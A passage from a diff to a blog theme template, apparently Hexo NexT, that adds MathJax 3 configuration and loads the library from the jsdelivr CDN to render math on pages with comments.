+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              const target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    const script = document.createElement('script');
+    script.src = '//cdn.jsdelivr.net/npm/mathjax@3.1.2/es5/tex-mml-chtml.js';
+    script.defer = true;
+    document.head.appendChild(script);
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.typesetClear();
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
 
 <script>
 NexT.utils.loadComments('#twikoo-comments', () => {
